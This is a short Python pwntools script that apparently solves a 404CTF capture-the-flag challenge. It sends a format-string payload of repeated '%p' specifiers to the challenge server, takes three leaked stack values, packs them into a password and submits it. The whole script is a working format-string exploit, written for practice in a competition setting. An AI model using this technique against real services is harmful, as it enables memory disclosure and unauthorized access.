#!/usr/bin/env python3

from pwn import *

def solve(ad1, ad2, ad3):
    r = pack(int(ad1, 16), "all", "little", True)
    r += pack(int(ad2, 16), "all", "little", True)
    r += pack(int(ad3, 16), "all", "little", True)
    return r

def main():
    payload = b"%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p"
    nc = remote("challenge.404ctf.fr", 31946)
    nc.readline()
    nc.sendline(payload)
    x = nc.readlineS().split(".")
    nc.readline()
    nc.readline()
    r = solve(x[15], x[16], x[17])
    print(f"Password found : {r}")
    nc.sendline(r)
    #nc.interactive()
    while True:
        try:
            print(nc.readlineS())
        except EOFError:
            break

main()
